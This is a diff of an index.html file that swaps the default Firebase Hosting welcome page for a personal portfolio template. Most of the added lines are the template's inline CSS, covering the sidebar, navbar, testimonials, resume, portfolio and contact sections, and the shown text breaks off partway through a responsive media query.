@@ -1,89 +1,3244 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Welcome to Firebase Hosting</title>
+<html lang="en">
 
-    <!-- update the version number as needed -->
-    <script defer src="/__/firebase/11.2.0/firebase-app-compat.js"></script>
-    <!-- include only the Firebase features as you need -->
-    <script defer src="/__/firebase/11.2.0/firebase-auth-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-database-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-firestore-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-functions-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-messaging-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-storage-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-analytics-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-remote-config-compat.js"></script>
-    <script defer src="/__/firebase/11.2.0/firebase-performance-compat.js"></script>
-    <!-- 
-      initialize the SDK after all desired features are loaded, set useEmulator to false
-      to avoid connecting the SDK to running emulators.
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ashraf | Portfolio</title>
+
+  <!--
+    - favicon
+  -->
+  <link rel="shortcut icon" href="https://ashraf-dess.web.app/assets/images/logo.png" type="image/x-icon">
+  <div class="moving-header">
+    <marquee behavior="scroll" direction="left" scrollamount="15">Free Palestine</marquee>
+    
+  </div>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <!--
+    - custom css link
+  -->
+<style>
+  /*-----------------------------------*\
+  #style.css
+\*-----------------------------------*/
+
+
+/**
+ * copyright 2022 @codewithsadee
+ */
+
+
+
+
+
+/*-----------------------------------*\
+  #CUSTOM PROPERTY
+\*-----------------------------------*/
+
+:root {
+
+/**
+ * colors
+ */
+
+/* gradient */
+
+--bg-gradient-onyx: linear-gradient(
+  to bottom right, 
+  hsl(240, 1%, 25%) 3%, 
+  hsl(0, 0%, 19%) 97%
+);
+--bg-gradient-jet: linear-gradient(
+  to bottom right, 
+  hsla(240, 1%, 18%, 0.251) 0%, 
+  hsla(240, 2%, 11%, 0) 100%
+), hsl(240, 2%, 13%);
+--bg-gradient-yellow-1: linear-gradient(
+  to bottom right, 
+  hsl(45, 100%, 71%) 0%, 
+  hsla(36, 100%, 69%, 0) 50%
+);
+--bg-gradient-yellow-2: linear-gradient(
+  135deg, 
+  hsla(45, 100%, 71%, 0.251) 0%, 
+  hsla(35, 100%, 68%, 0) 59.86%
+), hsl(240, 2%, 13%);
+--border-gradient-onyx: linear-gradient(
+  to bottom right, 
+  hsl(0, 0%, 25%) 0%, 
+  hsla(0, 0%, 25%, 0) 50%
+);
+--text-gradient-yellow: linear-gradient(
+  to right, 
+  hsl(45, 100%, 72%), 
+  hsl(35, 100%, 68%)
+);
+
+/* solid */
+
+--jet: hsl(0, 0%, 22%);
+--onyx: hsl(240, 1%, 17%);
+--eerie-black-1: hsl(240, 2%, 13%);
+--eerie-black-2: hsl(240, 2%, 12%);
+--smoky-black: hsl(0, 0%, 7%);
+--white-1: hsl(0, 0%, 100%);
+--white-2: hsl(0, 0%, 98%);
+--orange-yellow-crayola: hsl(45, 100%, 72%);
+--vegas-gold: hsl(45, 54%, 58%);
+--light-gray: hsl(0, 0%, 84%);
+--light-gray-70: hsla(0, 0%, 84%, 0.7);
+--bittersweet-shimmer: hsl(0, 43%, 51%);
+
+/**
+ * typography
+ */
+
+/* font-family */
+--ff-poppins: 'Poppins', sans-serif;
+
+/* font-size */
+--fs-1: 24px;
+--fs-2: 18px;
+--fs-3: 17px;
+--fs-4: 16px;
+--fs-5: 15px;
+--fs-6: 14px;
+--fs-7: 13px;
+--fs-8: 11px;
+
+/* font-weight */
+--fw-300: 300;
+--fw-400: 400;
+--fw-500: 500;
+--fw-600: 600;
+
+/**
+ * shadow
+ */
+
+--shadow-1: -4px 8px 24px hsla(0, 0%, 0%, 0.25);
+--shadow-2: 0 16px 30px hsla(0, 0%, 0%, 0.25);
+--shadow-3: 0 16px 40px hsla(0, 0%, 0%, 0.25);
+--shadow-4: 0 25px 50px hsla(0, 0%, 0%, 0.15);
+--shadow-5: 0 24px 80px hsla(0, 0%, 0%, 0.25);
+
+/**
+ * transition
+ */
+
+--transition-1: 0.25s ease;
+--transition-2: 0.5s ease-in-out;
+
+}
+
+/* Moving Header Styles */
+.moving-header {
+  background: var(--eerie-black-2) ;
+  border-bottom: 1px solid var(--jet);
+  padding: 10px 0;
+  position: sticky; /* Changed from fixed to sticky */
+  top: 0; /* Stick to the top of the viewport */
+  left: 0;
+  width: 100%;
+  z-index: 1000;
+  box-shadow: var(--shadow-2);
+  opacity: 80%;
+  
+}
+
+.moving-header marquee {
+  color: var(--orange-yellow-crayola);
+  font-size: var(--fs-4); /* Default font size */
+  font-weight: var(--fw-500);
+  text-transform: uppercase;
+  letter-spacing: 4px;
+}
+
+/* Responsive Adjustments */
+@media (max-width: 768px) {
+  .moving-header marquee {
+    font-size: var(--fs-5); /* Smaller font size for tablets and smaller screens */
+  }
+}
+
+@media (max-width: 400px) {
+  .moving-header marquee {
+    font-size: var(--fs-6); /* Even smaller font size for mobile devices */
+  }
+}
+
+main {
+  margin: 15px 12px 75px; /* Reset the top margin */
+  min-width: 259px;
+  padding-top: 60px; /* Add padding to avoid overlap with the sticky header */
+}
+
+/* Responsive Adjustments for Main Content */
+@media (max-width: 768px) {
+  main {
+    padding-top: 50px; /* Slightly smaller padding for tablets and smaller screens */
+  }
+}
+
+@media (max-width: 450px) {
+  main {
+    padding-top: 40px; /* Even smaller padding for mobile devices */
+  }
+}
+/* Floating WhatsApp Button Styles */
+.whatsapp-float {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: #25d366; /* WhatsApp green */
+      color: #fff;
+      border-radius: 30px;
+      padding: 10px 20px 10px 15px; /* Adjust padding for icon and text */
+      display: flex;
+      align-items: center;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
+      text-decoration: none;
+      transition: background-color 0.3s ease, transform 0.3s ease;
+    }
+
+    .whatsapp-float:hover {
+      background-color: #128c7e; /* Darker green on hover */
+      transform: scale(1.05); /* Slightly enlarge on hover */
+    }
+
+    /* WhatsApp SVG Icon */
+    .whatsapp-icon {
+      width: 24px; /* Adjust size as needed */
+      height: 24px;
+      margin-right: 10px; /* Space between icon and text */
+      fill: #fff; /* Set SVG color to white */
+    }
+
+    /* Text */
+    .whatsapp-float span {
+      font-size: 16px;
+      font-family: Arial, sans-serif;
+      font-weight: 500;
+    }
+/*-----------------------------------*\
+  #ORDER
+\*-----------------------------------*/
+
+.order .article-title {
+  margin-bottom: 15px;
+}
+
+.order-subtitle {
+  color: var(--light-gray-70);
+  font-size: var(--fs-6);
+  margin-bottom: 30px;
+}
+
+.order-form {
+  background: var(--eerie-black-2);
+  border: 1px solid var(--jet);
+  border-radius: 14px;
+  padding: 20px;
+  box-shadow: var(--shadow-2);
+}
+
+.checkbox-group {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.checkbox-group label {
+  color: var(--light-gray);
+  font-size: var(--fs-6);
+}
+
+.checkbox-group input[type="checkbox"] {
+  margin-right: 10px;
+}
+
+.checkbox-group input[type="text"] {
+  margin-top: 10px;
+  width: 100%;
+}
+
+/* Confirmation Modal */
+.confirmation-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+  display: none; /* Hidden by default */
+}
+
+.confirmation-modal.active {
+  display: flex; /* Show the modal when active */
+}
+
+.confirmation-modal .modal-content {
+  background: var(--eerie-black-2);
+  border: 1px solid var(--jet);
+  border-radius: 14px;
+  padding: 20px;
+  box-shadow: var(--shadow-5);
+  text-align: center;
+}
+
+.confirmation-modal p {
+  color: var(--light-gray);
+  font-size: var(--fs-6);
+  margin-bottom: 20px;
+}
+
+.confirmation-modal .modal-buttons {
+  display: flex;
+  justify-content: space-between;
+}
+
+.confirmation-modal .modal-buttons button {
+  background: var(--border-gradient-onyx);
+  color: var(--orange-yellow-crayola);
+  padding: 10px 20px;
+  border-radius: 8px;
+  border: none;
+  cursor: pointer;
+}
+
+.confirmation-modal .modal-buttons button:hover {
+  background: var(--bg-gradient-yellow-1);
+}
+
+/*-----------------------------------*\
+#RESET
+\*-----------------------------------*/
+
+*, *::before, *::after {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+}
+
+a { text-decoration: none; }
+
+li { list-style: none; }
+
+img, ion-icon, a, button, time, span { display: block; }
+
+button {
+font: inherit;
+background: none;
+border: none;
+text-align: left;
+cursor: pointer;
+}
+
+input, textarea {
+display: block;
+width: 100%;
+background: none;
+font: inherit;
+}
+
+::selection {
+background: var(--orange-yellow-crayola);
+color: var(--smoky-black);
+}
+
+:focus { outline-color: var(--orange-yellow-crayola); }
+
+html { font-family: var(--ff-poppins); }
+
+body { background: var(--smoky-black); }
+
+
+
+
+
+/*-----------------------------------*\
+#REUSED STYLE
+\*-----------------------------------*/
+
+.sidebar,
+article {
+background: var(--eerie-black-2);
+border: 1px solid var(--jet);
+border-radius: 20px;
+padding: 15px;
+box-shadow: var(--shadow-1);
+z-index: 1;
+}
+
+.separator {
+width: 100%;
+height: 1px;
+background: var(--jet);
+margin: 16px 0;
+}
+
+.icon-box {
+position: relative;
+background: var(--border-gradient-onyx);
+width: 30px;
+height: 30px;
+border-radius: 8px;
+display: flex;
+justify-content: center;
+align-items: center;
+font-size: 16px;
+color: var(--orange-yellow-crayola);
+box-shadow: var(--shadow-1);
+z-index: 1;
+}
+
+.icon-box::before {
+content: "";
+position: absolute;
+inset: 1px;
+background: var(--eerie-black-1);
+border-radius: inherit;
+z-index: -1;
+}
+
+.icon-box ion-icon { --ionicon-stroke-width: 35px; }
+
+article { display: none; }
+
+article.active {
+display: block;
+animation: fade 0.5s ease backwards;
+}
+
+@keyframes fade {
+0% { opacity: 0; }
+100% { opacity: 1; }
+}
+
+.h2,
+.h3,
+.h4,
+.h5 {
+color: var(--white-2);
+text-transform: capitalize;
+}
+
+.h2 { font-size: var(--fs-1); }
+
+.h3 { font-size: var(--fs-2); }
+
+.h4 { font-size: var(--fs-4); }
+
+.h5 {
+font-size: var(--fs-7);
+font-weight: var(--fw-500);
+}
+
+.article-title {
+position: relative;
+padding-bottom: 7px;
+}
+
+.article-title::after {
+content: "";
+position: absolute;
+bottom: 0;
+left: 0;
+width: 30px;
+height: 3px;
+background: var(--text-gradient-yellow);
+border-radius: 3px;
+}
+
+.has-scrollbar::-webkit-scrollbar {
+width: 5px; /* for vertical scrollbar */
+height: 5px; /* for horizontal scrollbar */
+}
+
+.has-scrollbar::-webkit-scrollbar-track {
+background: var(--onyx);
+border-radius: 5px;
+}
+
+.has-scrollbar::-webkit-scrollbar-thumb {
+background: var(--orange-yellow-crayola);
+border-radius: 5px;
+}
+
+.has-scrollbar::-webkit-scrollbar-button { width: 20px; }
+
+.content-card {
+position: relative;
+background: var(--border-gradient-onyx);
+padding: 15px;
+padding-top: 45px;
+border-radius: 14px;
+box-shadow: var(--shadow-2);
+cursor: pointer;
+z-index: 1;
+}
+
+.content-card::before {
+content: "";
+position: absolute;
+inset: 1px;
+background: var(--bg-gradient-jet);
+border-radius: inherit;
+z-index: -1;
+}
+
+
+
+
+
+/*-----------------------------------*\
+#MAIN
+\*-----------------------------------*/
+
+main {
+margin: 15px 12px;
+margin-bottom: 75px;
+min-width: 259px;
+}
+
+
+
+
+
+/*-----------------------------------*\
+#SIDEBAR
+\*-----------------------------------*/
+
+.sidebar {
+margin-bottom: 15px;
+max-height: 112px;
+overflow: hidden;
+transition: var(--transition-2);
+}
+
+.sidebar.active { max-height: 405px; }
+
+.sidebar-info {
+position: relative;
+display: flex;
+justify-content: flex-start;
+align-items: center;
+gap: 15px;
+}
+
+.avatar-box {
+background: var(--bg-gradient-onyx);
+border-radius: 20px;
+}
+
+.info-content .name {
+color: var(--white-2);
+font-size: var(--fs-3);
+font-weight: var(--fw-500);
+letter-spacing: -0.25px;
+margin-bottom: 10px;
+}
+
+.info-content .title {
+color: var(--white-1);
+background: var(--onyx);
+font-size: var(--fs-8);
+font-weight: var(--fw-300);
+width: max-content;
+padding: 3px 12px;
+border-radius: 8px;
+}
+
+.info_more-btn {
+position: absolute;
+top: -15px;
+right: -15px;
+border-radius: 0 15px;
+font-size: 13px;
+color: var(--orange-yellow-crayola);
+background: var(--border-gradient-onyx);
+padding: 10px;
+box-shadow: var(--shadow-2);
+transition: var(--transition-1);
+z-index: 1;
+}
+
+.info_more-btn::before {
+content: "";
+position: absolute;
+inset: 1px;
+border-radius: inherit;
+background: var(--bg-gradient-jet);
+transition: var(--transition-1);
+z-index: -1;
+}
+
+.info_more-btn:hover,
+.info_more-btn:focus { background: var(--bg-gradient-yellow-1); }
+
+.info_more-btn:hover::before,
+.info_more-btn:focus::before { background: var(--bg-gradient-yellow-2); }
+
+.info_more-btn span { display: none; }
+
+.sidebar-info_more {
+opacity: 0;
+visibility: hidden;
+transition: var(--transition-2);
+}
+
+.sidebar.active .sidebar-info_more {
+opacity: 1;
+visibility: visible;
+}
+
+.contacts-list {
+display: grid;
+grid-template-columns: 1fr;
+gap: 16px;
+}
+
+.contact-item {
+min-width: 100%;
+display: flex;
+align-items: center;
+gap: 16px;
+}
+
+.contact-info {
+max-width: calc(100% - 46px);
+width: calc(100% - 46px);
+}
+
+.contact-title {
+color: var(--light-gray-70);
+font-size: var(--fs-8);
+text-transform: uppercase;
+margin-bottom: 2px;
+}
+
+.contact-info :is(.contact-link, time, address) {
+color: var(--white-2);
+font-size: var(--fs-7);
+}
+
+.contact-info address { font-style: normal; }
+
+.social-list {
+display: flex;
+justify-content: flex-start;
+align-items: center;
+gap: 15px;
+padding-bottom: 4px;
+padding-left: 7px;
+}
+
+.social-item .social-link {
+color: var(--light-gray-70);
+font-size: 18px;
+}
+
+
+.social-item .social-link:hover { color: var(--light-gray); }
+
+
+
+
+
+/*-----------------------------------*\
+#NAVBAR
+\*-----------------------------------*/
+
+.navbar {
+position: fixed;
+bottom: 0;
+left: 0;
+width: 100%;
+background: hsla(240, 1%, 17%, 0.75);
+backdrop-filter: blur(10px);
+border: 1px solid var(--jet);
+border-radius: 12px 12px 0 0;
+box-shadow: var(--shadow-2);
+z-index: 5;
+}
+
+.navbar-list {
+display: flex;
+flex-wrap: wrap;
+justify-content: center;
+align-items: center;
+padding: 0 10px;
+}
+
+.navbar-link {
+color: var(--light-gray);
+font-size: var(--fs-8);
+padding: 20px 7px;
+transition: color var(--transition-1);
+}
+
+.navbar-link:hover,
+.navbar-link:focus { color: var(--light-gray-70); }
+
+.navbar-link.active { color: var(--orange-yellow-crayola); }
+
+
+
+
+
+/*-----------------------------------*\
+#ABOUT
+\*-----------------------------------*/
+
+.about .article-title { margin-bottom: 15px; }
+
+.about-text {
+color: var(--light-gray);
+font-size: var(--fs-6);
+font-weight: var(--fw-300);
+line-height: 1.6;
+}
+
+.about-text p { margin-bottom: 15px; }
+
+
+
+/**
+* #service 
+*/
+
+.service { margin-bottom: 35px; }
+
+.service-title { margin-bottom: 20px; }
+
+.service-list {
+display: grid;
+grid-template-columns: 1fr;
+gap: 20px;
+}
+
+.service-item {
+position: relative;
+background: var(--border-gradient-onyx);
+padding: 20px;
+border-radius: 14px;
+box-shadow: var(--shadow-2);
+z-index: 1;
+}
+
+.service-item::before {
+content: "";
+position: absolute;
+inset: 1px;
+background: var(--bg-gradient-jet);
+border-radius: inherit;
+z-index: -1;
+}
+
+.service-icon-box { margin-bottom: 10px; }
+
+.service-icon-box img { margin: auto; }
+
+.service-content-box { text-align: center; }
+
+.service-item-title { margin-bottom: 7px; }
+
+.service-item-text {
+color: var(--light-gray);
+font-size: var(--fs-6);
+font-weight: var(--fw-3);
+line-height: 1.6;
+}
+
+
+/**
+* #testimonials 
+*/
+
+.testimonials { margin-bottom: 30px; }
+
+.testimonials-title { margin-bottom: 20px; }
+
+.testimonials-list {
+display: flex;
+justify-content: flex-start;
+align-items: flex-start;
+gap: 15px;
+margin: 0 -15px;
+padding: 25px 15px;
+padding-bottom: 35px;
+overflow-x: auto;
+scroll-behavior: smooth;
+overscroll-behavior-inline: contain;
+scroll-snap-type: inline mandatory;
+}
+
+.testimonials-item {
+min-width: 100%;
+scroll-snap-align: center;
+}
+
+.testimonials-avatar-box {
+position: absolute;
+top: 0;
+left: 0;
+transform: translate(15px, -25px);
+background: var(--bg-gradient-onyx);
+border-radius: 14px;
+box-shadow: var(--shadow-1);
+}
+
+.testimonials-item-title { margin-bottom: 7px; }
+
+.testimonials-text {
+color: var(--light-gray);
+font-size: var(--fs-6);
+font-weight: var(--fw-300);
+line-height: 1.6;
+display: -webkit-box;
+line-clamp: 4;
+-webkit-line-clamp: 4;
+-webkit-box-orient: vertical;
+overflow: hidden;
+}
+
+
+/**
+* #testimonials-modal
+*/
+
+.modal-container {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+display: flex;
+justify-content: center;
+align-items: center;
+overflow-y: auto;
+overscroll-behavior: contain;
+z-index: 20;
+pointer-events: none;
+visibility: hidden;
+}
+
+.modal-container::-webkit-scrollbar { display: none; }
+
+.modal-container.active {
+pointer-events: all;
+visibility: visible;
+}
+
+.overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100vh;
+background: hsl(0, 0%, 5%);
+opacity: 0;
+visibility: hidden;
+pointer-events: none;
+z-index: 1;
+transition: var(--transition-1);
+}
+
+.overlay.active {
+opacity: 0.8;
+visibility: visible;
+pointer-events: all;
+}
+
+.testimonials-modal {
+background: var(--eerie-black-2);
+position: relative;
+padding: 15px;
+margin: 15px 12px;
+border: 1px solid var(--jet);
+border-radius: 14px;
+box-shadow: var(--shadow-5);
+transform: scale(1.2);
+opacity: 0;
+transition: var(--transition-1);
+z-index: 2;
+}
+
+.modal-container.active .testimonials-modal {
+transform: scale(1);
+opacity: 1;
+}
+
+.modal-close-btn {
+position: absolute;
+top: 15px;
+right: 15px;
+background: var(--onyx);
+border-radius: 8px;
+width: 32px;
+height: 32px;
+display: flex;
+justify-content: center;
+align-items: center;
+color: var(--white-2);
+font-size: 18px;
+opacity: 0.7;
+}
+
+.modal-close-btn:hover,
+.modal-close-btn:focus { opacity: 1; }
+
+.modal-close-btn ion-icon { --ionicon-stroke-width: 50px; }
+
+.modal-avatar-box {
+background: var(--bg-gradient-onyx);
+width: max-content;
+border-radius: 14px;
+margin-bottom: 15px;
+box-shadow: var(--shadow-2);
+}
+
+.modal-img-wrapper > img { display: none; }
+
+.modal-title { margin-bottom: 4px; }
+
+.modal-content time {
+font-size: var(--fs-6);
+color: var(--light-gray-70);
+font-weight: var(--fw-300);
+margin-bottom: 10px;
+}
+
+.modal-content p {
+color: var(--light-gray);
+font-size: var(--fs-6);
+font-weight: var(--fw-300);
+line-height: 1.6;
+}
+
+
+/**
+* #clients 
+*/
+
+.clients { margin-bottom: 15px; }
+
+.clients-list {
+display: flex;
+justify-content: flex-start;
+align-items: flex-start;
+gap: 15px;
+margin: 0 -15px;
+padding: 25px;
+padding-bottom: 25px;
+overflow-x: auto;
+scroll-behavior: smooth;
+overscroll-behavior-inline: contain;
+scroll-snap-type: inline mandatory;
+scroll-padding-inline: 25px;
+}
+
+.clients-item {
+min-width: 50%;
+scroll-snap-align: start;
+}
+
+.clients-item img {
+width: 100%;
+filter: grayscale(1);
+transition: var(--transition-1);
+}
+
+.clients-item img:hover { filter: grayscale(0); }
+
+
+
+
+
+/*-----------------------------------*\
+#RESUME
+\*-----------------------------------*/
+
+.article-title { margin-bottom: 30px; }
+
+
+/**
+* education and experience 
+*/
+
+.timeline { margin-bottom: 30px; }
+
+.timeline .title-wrapper {
+display: flex;
+align-items: center;
+gap: 15px;
+margin-bottom: 25px;
+}
+
+.timeline-list {
+font-size: var(--fs-6);
+margin-left: 45px;
+}
+
+.timeline-item { position: relative; }
+
+.timeline-item:not(:last-child) { margin-bottom: 20px; }
+
+.timeline-item-title {
+font-size: var(--fs-6);
+line-height: 1.3;
+margin-bottom: 7px;
+}
+
+.timeline-list span {
+color: var(--vegas-gold);
+font-weight: var(--fw-400);
+line-height: 1.6;
+}
+
+.timeline-item:not(:last-child)::before {
+content: "";
+position: absolute;
+top: -25px;
+left: -30px;
+width: 1px;
+height: calc(100% + 50px);
+background: var(--jet);
+}
+
+.timeline-item::after {
+content: "";
+position: absolute;
+top: 5px;
+left: -33px;
+height: 6px;
+width: 6px;
+background: var(--text-gradient-yellow);
+border-radius: 50%;
+box-shadow: 0 0 0 4px var(--jet);
+}
+
+.timeline-text {
+color: var(--light-gray);
+font-weight: var(--fw-300);
+line-height: 1.6;
+}
+
+
+/**
+* skills 
+*/
+
+.skills-title { margin-bottom: 20px; }
+
+.skills-list { padding: 20px; }
+
+
+.skills-item:not(:last-child) { margin-bottom: 15px; }
+
+.skill .title-wrapper {
+display: flex;
+align-items: center;
+gap: 5px;
+margin-bottom: 8px;
+}
+
+.skill .title-wrapper data {
+color: var(--light-gray);
+font-size: var(--fs-7);
+font-weight: var(--fw-300);
+}
+
+.skill-progress-bg {
+background: var(--jet);
+width: 100%;
+height: 8px;
+border-radius: 10px;
+}
+
+.skill-progress-fill {
+background: var(--text-gradient-yellow);
+height: 100%;
+border-radius: inherit;
+}
+
+
+
+
+
+/*-----------------------------------*\
+#PORTFOLIO
+\*-----------------------------------*/
+
+.filter-list { display: none; }
+
+.filter-select-box {
+position: relative;
+margin-bottom: 25px;
+}
+
+.filter-select {
+background: var(--eerie-black-2);
+color: var(--light-gray);
+display: flex;
+justify-content: space-between;
+align-items: center;
+width: 100%;
+padding: 12px 16px;
+border: 1px solid var(--jet);
+border-radius: 14px;
+font-size: var(--fs-6);
+font-weight: var(--fw-300);
+}
+
+.filter-select.active .select-icon { transform: rotate(0.5turn); }
+
+.select-list {
+background: var(--eerie-black-2);
+position: absolute;
+top: calc(100% + 6px);
+width: 100%;
+padding: 6px;
+border: 1px solid var(--jet);
+border-radius: 14px;
+z-index: 2;
+opacity: 0;
+visibility: hidden;
+pointer-events: none;
+transition: 0.15s ease-in-out;
+}
+
+.filter-select.active + .select-list {
+opacity: 1;
+visibility: visible;
+pointer-events: all;
+}
+
+.select-item button {
+background: var(--eerie-black-2);
+color: var(--light-gray);
+font-size: var(--fs-6);
+font-weight: var(--fw-300);
+text-transform: capitalize;
+width: 100%;
+padding: 8px 10px;
+border-radius: 8px;
+}
+
+.select-item button:hover { --eerie-black-2: hsl(240, 2%, 20%); }
+
+.project-list {
+display: grid;
+grid-template-columns: 1fr;
+gap: 30px;
+margin-bottom: 10px;
+}
+
+.project-item { display: none; }
+
+.project-item.active {
+display: block;
+animation: scaleUp 0.25s ease forwards;
+}
+
+@keyframes scaleUp {
+0% { transform: scale(0.5); }
+100% { transform: scale(1); }
+}
+
+.project-item > a { width: 100%; }
+
+.project-img {
+position: relative;
+width: 100%;
+height: 200px;
+border-radius: 16px;
+overflow: hidden;
+margin-bottom: 15px;
+}
+
+.project-img::before {
+content: "";
+position: absolute;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: transparent;
+z-index: 1;
+transition: var(--transition-1);
+}
+
+.project-item > a:hover .project-img::before { background: hsla(0, 0%, 0%, 0.5); }
+
+.project-item-icon-box {
+--scale: 0.8;
+
+background: var(--jet);
+color: var(--orange-yellow-crayola);
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%) scale(var(--scale));
+font-size: 20px;
+padding: 18px;
+border-radius: 12px;
+opacity: 0;
+z-index: 1;
+transition: var(--transition-1);
+}
+
+.project-item > a:hover .project-item-icon-box {
+--scale: 1;
+opacity: 1;
+}
+
+.project-item-icon-box ion-icon { --ionicon-stroke-width: 50px; }
+
+.project-img img {
+width: 100%;
+height: 100%;
+object-fit: cover;
+transition: var(--transition-1);
+}
+
+.project-item > a:hover img { transform: scale(1.1); }
+
+.project-title,
+.project-category { margin-left: 10px; }
+
+.project-title {
+color: var(--white-2);
+font-size: var(--fs-5);
+font-weight: var(--fw-400);
+text-transform: capitalize;
+line-height: 1.3;
+}
+
+.project-category {
+color: var(--light-gray-70);
+font-size: var(--fs-6);
+font-weight: var(--fw-300);
+}
+
+
+
+
+
+/*-----------------------------------*\
+#CONTACT
+\*-----------------------------------*/
+
+.mapbox {
+position: relative;
+height: 250px;
+width: 100%;
+border-radius: 16px;
+margin-bottom: 30px;
+border: 1px solid var(--jet);
+overflow: hidden;
+}
+
+.mapbox figure { height: 100%; }
+
+.mapbox iframe {
+width: 100%;
+height: 100%;
+border: none;
+filter: grayscale(1) invert(1);
+}
+
+.contact-form { margin-bottom: 10px; }
+
+.form-title { margin-bottom: 20px; }
+
+.input-wrapper {
+display: grid;
+grid-template-columns: 1fr;
+gap: 25px;
+margin-bottom: 25px;
+}
+
+.form-input {
+color: var(--white-2);
+font-size: var(--fs-6);
+font-weight: var(--fw-400);
+padding: 13px 20px;
+border: 1px solid var(--jet);
+border-radius: 14px;
+outline: none;
+}
+
+.form-input::placeholder { font-weight: var(--fw-500); }
+
+.form-input:focus { border-color: var(--orange-yellow-crayola); }
+
+textarea.form-input {
+min-height: 100px;
+height: 120px;
+max-height: 200px;
+resize: vertical;
+margin-bottom: 25px;
+}
+
+textarea.form-input::-webkit-resizer { display: none; }
+
+.form-input:focus:invalid { border-color: var(--bittersweet-shimmer); }
+
+.form-btn {
+position: relative;
+width: 100%;
+background: var(--border-gradient-onyx);
+color: var(--orange-yellow-crayola);
+display: flex;
+justify-content: center;
+align-items: center;
+gap: 10px;
+padding: 13px 20px;
+border-radius: 14px;
+font-size: var(--fs-6);
+text-transform: capitalize;
+box-shadow: var(--shadow-3);
+z-index: 1;
+transition: var(--transition-1);
+}
+
+.form-btn::before {
+content: "";
+position: absolute;
+inset: 1px;
+background: var(--bg-gradient-jet);
+border-radius: inherit;
+z-index: -1;
+transition: var(--transition-1);
+}
+
+.form-btn ion-icon { font-size: 16px; }
+
+.form-btn:hover { background: var(--bg-gradient-yellow-1); }
+
+.form-btn:hover::before { background: var(--bg-gradient-yellow-2); }
+
+.form-btn:disabled {
+opacity: 0.7;
+cursor: not-allowed;
+}
+
+.form-btn:disabled:hover { background: var(--border-gradient-onyx); }
+
+.form-btn:disabled:hover::before { background: var(--bg-gradient-jet); }
+
+
+
+
+
+/*-----------------------------------*\
+#RESPONSIVE
+\*-----------------------------------*/
+
+/**
+* responsive larger than 450px screen
+*/
+
+@media (min-width: 450px) {
+
+/**
+ * client
+ */
+
+.clients-item { min-width: calc(33.33% - 10px); }
+
+
+
+/**
+ * #PORTFOLIO, BLOG 
+ */
+
+.project-img,
+.blog-banner-box { height: auto; }
+
+}
+
+
+
+
+
+/**
+* responsive larger than 580px screen
+*/
+
+@media (min-width: 580px) {
+
+/**
+ * CUSTOM PROPERTY
+ */
+
+:root {
+
+  /**
+   * typography
+   */
+
+  --fs-1: 32px;
+  --fs-2: 24px;
+  --fs-3: 26px;
+  --fs-4: 18px;
+  --fs-6: 15px;
+  --fs-7: 15px;
+  --fs-8: 12px;
+
+}
+
+
+
+/**
+ * #REUSED STYLE
+ */
+
+.sidebar, article {
+  width: 520px;
+  margin-inline: auto;
+  padding: 30px;
+}
+
+.article-title {
+  font-weight: var(--fw-600);
+  padding-bottom: 15px;
+}
+
+.article-title::after {
+  width: 40px;
+  height: 5px;
+}
+
+.icon-box {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  font-size: 18px;
+}
+
+
+
+/**
+ * #MAIN
+ */
+
+main {
+  margin-top: 60px;
+  margin-bottom: 100px;
+}
+
+
+
+/**
+ * #SIDEBAR
+ */
+
+.sidebar {
+  max-height: 180px;
+  margin-bottom: 30px;
+}
+
+.sidebar.active { max-height: 584px; }
+
+.sidebar-info { gap: 25px; }
+
+.avatar-box { border-radius: 30px; }
+
+.avatar-box img { width: 120px; }
+
+.info-content .name { margin-bottom: 15px; }
+
+.info-content .title { padding: 5px 18px; }
+
+.info_more-btn {
+  top: -30px;
+  right: -30px;
+  padding: 10px 15px;
+}
+
+.info_more-btn span {
+  display: block;
+  font-size: var(--fs-8);
+}
+
+.info_more-btn ion-icon { display: none; }
+
+.separator { margin: 32px 0; }
+
+.contacts-list { gap: 20px; }
+
+.contact-info {
+  max-width: calc(100% - 64px);
+  width: calc(100% - 64px);
+}
+
+
+
+/**
+ * #NAVBAR
+ */
+
+.navbar { border-radius: 20px 20px 0 0; }
+
+.navbar-list { gap: 20px; }
+
+.navbar-link { --fs-8: 14px; }
+
+
+
+/**
+ * #ABOUT
+ */
+
+.about .article-title { margin-bottom: 20px; }
+
+.about-text { margin-bottom: 40px; }
+
+/* service */
+
+.service-item {
+  display: flex;
+  justify-content: flex-start;
+  align-items: flex-start;
+  gap: 18px;
+  padding: 30px;
+}
+
+.service-icon-box {
+  margin-bottom: 0;
+  margin-top: 5px;
+}
+
+.service-content-box { text-align: left; }
+
+/* testimonials */
+
+.testimonials-title { margin-bottom: 25px; }
+
+.testimonials-list {
+  gap: 30px;
+  margin: 0 -30px;
+  padding: 30px;
+  padding-bottom: 35px;
+}
+
+.content-card {
+  padding: 30px;
+  padding-top: 25px;
+}
+
+.testimonials-avatar-box {
+  transform: translate(30px, -30px);
+  border-radius: 20px;
+}
+
